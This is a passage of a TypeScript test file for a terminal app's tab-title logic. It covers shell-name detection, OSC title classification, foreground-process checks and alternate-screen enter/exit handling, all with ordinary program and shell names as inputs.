  it("알려진 셸 이름 → true", () => {
    for (const sh of ["sh", "bash", "zsh", "fish", "dash", "ksh", "tcsh", "csh"]) {
      expect(isLoginShell(sh)).toBe(true);
    }
  });

  it("Windows shells, named as the agent names them there", () => {
    for (const sh of ["powershell", "pwsh", "cmd", "CMD", "nu", "wsl", "WSL"]) {
      expect(isLoginShell(sh)).toBe(true);
    }
  });

  it("로그인 셸 prefix '-' 제거 후 판정 (ps -o comm=)", () => {
    expect(isLoginShell("-zsh")).toBe(true);
    expect(isLoginShell("-bash")).toBe(true);
  });

  it("실제 프로그램 → false", () => {
    expect(isLoginShell("node")).toBe(false);
    expect(isLoginShell("claude")).toBe(false);
    expect(isLoginShell("lazygit")).toBe(false);
    expect(isLoginShell("")).toBe(false);
  });
});

describe("classifyOscTitle", () => {
  it("alternate + 비셸틱 → apply (lazygit/yazi/vim)", () => {
    expect(classifyOscTitle("lazygit", "alternate")).toBe("apply");
    expect(classifyOscTitle("", "alternate")).toBe("apply");
  });

  it("alternate + 셸틱 → ignore (변종 prompt; alt-enter RPC가 라벨링)", () => {
    expect(classifyOscTitle("Yazi: ~/workspaces/img_intern", "alternate")).toBe("ignore");
    expect(classifyOscTitle("kih@host:~/x", "alternate")).toBe("ignore");
  });

  it("normal + 셸틱 → clear (프롬프트 복귀 / inline TUI 종료 정리)", () => {
    expect(classifyOscTitle("kih@monolith:~/workspaces/img_intern", "normal")).toBe("clear");
    expect(classifyOscTitle("/abs/path", "normal")).toBe("clear");
  });

  it("normal + 비셸틱 → confirm (claude 등 — foreground 확인 필요)", () => {
    expect(classifyOscTitle("✳ Claude Code", "normal")).toBe("confirm");
    expect(classifyOscTitle("ls -G", "normal")).toBe("confirm");
  });
});

describe("foregroundConfirmsTitle", () => {
  it("실제 프로그램이 foreground → 적용", () => {
    expect(foregroundConfirmsTitle("node")).toBe(true);
    expect(foregroundConfirmsTitle("claude")).toBe(true);
  });

  it("셸이 foreground 또는 빈 값 → 거부 (명령 에코 노이즈)", () => {
    expect(foregroundConfirmsTitle("zsh")).toBe(false);
    expect(foregroundConfirmsTitle("-bash")).toBe(false);
    expect(foregroundConfirmsTitle("")).toBe(false);
    expect(foregroundConfirmsTitle("   ")).toBe(false);
  });

  it("rejects a remote login in front: its titles are a remote shell's echoes", () => {
    expect(foregroundConfirmsTitle("ssh")).toBe(false);
    expect(foregroundConfirmsTitle("mosh-client")).toBe(false);
  });
});

describe("services/terminal controller — OSC title sync", () => {
  beforeEach(() => {
    resetStores();
    resetIpc();
  });

  async function setupWithTab() {
    const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
    const harness = makeTerminalControllerDeps();
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: tab.id,
        cwd: "/workspace",
        container: {} as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const titleHandler = harness.getTitleHandler();
    if (!titleHandler) throw new Error("onTitleChange handler was not registered");
    return { harness, controller, tab, titleHandler };
  }

  it("빈 OSC title은 processTitle clear → defaultTitle로 복귀", async () => {
    const { controller, tab, titleHandler } = await setupWithTab();
    titleHandler("lazygit");
    titleHandler("");

    const updated = useTabsStore.getState().byWorkspace[WS][tab.id];
    expect(updated.processTitle).toBeUndefined();
    expect(updated.title).toBe("Terminal");

    controller.dispose();
  });

  it("normal screen 명령 에코는 foreground가 셸이면 무시 — starship preexec 가드", async () => {
    mockForegroundProcessName = "zsh";
    const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
    const harness = makeTerminalControllerDeps();
    harness.setBufferType("normal");
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: tab.id,
        cwd: "/workspace",
        container: {} as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const titleHandler = harness.getTitleHandler();
    if (!titleHandler) throw new Error("title handler missing");

    titleHandler("ls -G");
    await Promise.resolve();
    await Promise.resolve();

    const updated = useTabsStore.getState().byWorkspace[WS][tab.id];
    expect(updated.processTitle).toBeUndefined();
    expect(updated.title).toBe("Terminal");

    controller.dispose();
    mockForegroundProcessName = "lazygit";
  });

  it("drops a deferred title that a later title overtook", async () => {
    mockForegroundProcessName = "ls";
    const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
    const harness = makeTerminalControllerDeps();
    harness.setBufferType("normal");
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: tab.id,
        cwd: "/workspace",
        container: {} as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const titleHandler = harness.getTitleHandler();
    if (!titleHandler) throw new Error("title handler missing");

    titleHandler("ls --color=auto");
    titleHandler("user@host:~");
    await Promise.resolve();
    await Promise.resolve();

    expect(useTabsStore.getState().byWorkspace[WS][tab.id].processTitle).toBeUndefined();

    controller.dispose();
    mockForegroundProcessName = "lazygit";
  });

  it("normal screen inline TUI(claude)는 foreground가 실제 프로그램이면 적용", async () => {
    mockForegroundProcessName = "node";
    const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
    const harness = makeTerminalControllerDeps();
    harness.setBufferType("normal");
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: tab.id,
        cwd: "/workspace",
        container: {} as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const titleHandler = harness.getTitleHandler();
    if (!titleHandler) throw new Error("title handler missing");

    titleHandler("✳ Claude Code");
    await Promise.resolve();
    await Promise.resolve();

    expect(useTabsStore.getState().byWorkspace[WS][tab.id].title).toBe("✳ Claude Code");

    controller.dispose();
    mockForegroundProcessName = "lazygit";
  });

  it("normal screen 셸 프롬프트는 processTitle을 clear — inline TUI 종료 시 복귀", async () => {
    const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
    useTabsStore.getState().setProcessTitle(WS, tab.id, "✳ Claude Code");
    const harness = makeTerminalControllerDeps();
    harness.setBufferType("normal");
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: tab.id,
        cwd: "/workspace",
        container: {} as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const titleHandler = harness.getTitleHandler();
    if (!titleHandler) throw new Error("title handler missing");

    titleHandler("kih@monolith:~/workspaces/img_intern");

    const updated = useTabsStore.getState().byWorkspace[WS][tab.id];
    expect(updated.processTitle).toBeUndefined();
    expect(updated.title).toBe("Terminal");

    controller.dispose();
  });

  it("alternate ↔ normal 전이를 거치는 시나리오 — TUI title만 적용 + 종료 시 자동 복귀", async () => {
    const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
    const harness = makeTerminalControllerDeps();
    harness.setBufferType("normal");
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: tab.id,
        cwd: "/workspace",
        container: {} as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const titleHandler = harness.getTitleHandler();
    const altExitHandler = harness.getAltExitHandler();
    if (!titleHandler) throw new Error("title handler missing");
    if (!altExitHandler) throw new Error("alt-exit handler missing");

    mockForegroundProcessName = "zsh";
    titleHandler("ls -G");
    await Promise.resolve();
    await Promise.resolve();
    expect(useTabsStore.getState().byWorkspace[WS][tab.id].processTitle).toBeUndefined();

    mockForegroundProcessName = "lazygit";
    harness.setBufferType("alternate");
    titleHandler("lazygit");
    expect(useTabsStore.getState().byWorkspace[WS][tab.id].title).toBe("lazygit");

    harness.setBufferType("normal");
    const ret = altExitHandler([1049]);
    expect(ret).toBe(false);
    const updated = useTabsStore.getState().byWorkspace[WS][tab.id];
    expect(updated.processTitle).toBeUndefined();
    expect(updated.title).toBe("Terminal");

    controller.dispose();
  });

  it("alt-exit CSI handler가 47 / 1047 / 1049 세 변형 모두 처리", async () => {
    const variants = [47, 1047, 1049];
    for (const v of variants) {
      const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
      const harness = makeTerminalControllerDeps();
      const controller = createTerminalController(
        {
          workspaceId: WS,
          tabId: tab.id,
          cwd: "/workspace",
          container: {} as HTMLElement,
          autoSpawn: false,
        },
        harness.deps,
      );
      await flushTerminalInit();
      const titleHandler = harness.getTitleHandler();
      const altExit = harness.getAltExitHandler();
      if (!titleHandler || !altExit) throw new Error("handlers missing");

      titleHandler("claude");
      expect(useTabsStore.getState().byWorkspace[WS][tab.id].title).toBe("claude");

      altExit([v]);
      expect(useTabsStore.getState().byWorkspace[WS][tab.id].title).toBe("Terminal");

      controller.dispose();
      useTabsStore.getState().removeTab(WS, tab.id);
    }
  });

  it("alt-exit CSI가 47/1047/1049 외 param이면 processTitle 보존 (다른 CSI ?...l 시퀀스 가드)", async () => {
    const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
    const harness = makeTerminalControllerDeps();
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: tab.id,
        cwd: "/workspace",
        container: {} as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const titleHandler = harness.getTitleHandler();
    const altExit = harness.getAltExitHandler();
    if (!titleHandler || !altExit) throw new Error("handlers missing");

    titleHandler("claude");
    altExit([25]);
    expect(useTabsStore.getState().byWorkspace[WS][tab.id].title).toBe("claude");

    controller.dispose();
  });

  it("alt-enter 시 fg process RPC 호출 → processTitle 적용 (OSC 없는 lazygit 시나리오)", async () => {
    mockForegroundProcessName = "lazygit";
    const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
    const harness = makeTerminalControllerDeps();
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: tab.id,
        cwd: "/workspace",
        container: {} as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const altEnter = harness.getAltEnterHandler();
    if (!altEnter) throw new Error("alt-enter handler missing");

    const ret = altEnter([1049]);
    expect(ret).toBe(false);

    await Promise.resolve();
    await Promise.resolve();

    expect(ipcCalls).toContainEqual({
      channel: "pty",
      method: "foregroundProcess",
      args: { workspaceId: WS, tabId: tab.id },
    });
    expect(useTabsStore.getState().byWorkspace[WS][tab.id].title).toBe("lazygit");

    controller.dispose();
  });

  it("alt-enter RPC가 빈 이름 반환 시 기존 title 보존 (RPC 실패 fallback)", async () => {
    mockForegroundProcessName = "";
    const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
    const harness = makeTerminalControllerDeps();
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: tab.id,
        cwd: "/workspace",
        container: {} as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const altEnter = harness.getAltEnterHandler();
    if (!altEnter) throw new Error("alt-enter handler missing");

    altEnter([1049]);
    await Promise.resolve();
    await Promise.resolve();

    const updated = useTabsStore.getState().byWorkspace[WS][tab.id];
    expect(updated.processTitle).toBeUndefined();
    expect(updated.title).toBe("Terminal");

    controller.dispose();
    mockForegroundProcessName = "lazygit";
  });

  it("alt-enter param이 47/1047/1049 외면 RPC 호출 안 함 (cursor show 등 다른 ?h 시퀀스 가드)", async () => {
    const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
    const harness = makeTerminalControllerDeps();
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: tab.id,
        cwd: "/workspace",
        container: {} as HTMLElement,
        autoSpawn: false,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const altEnter = harness.getAltEnterHandler();
    if (!altEnter) throw new Error("alt-enter handler missing");

    altEnter([25]);
    await Promise.resolve();
    await Promise.resolve();

    expect(ipcCalls.some((c) => c.channel === "pty" && c.method === "foregroundProcess")).toBe(
      false,
    );

    controller.dispose();
  });
});
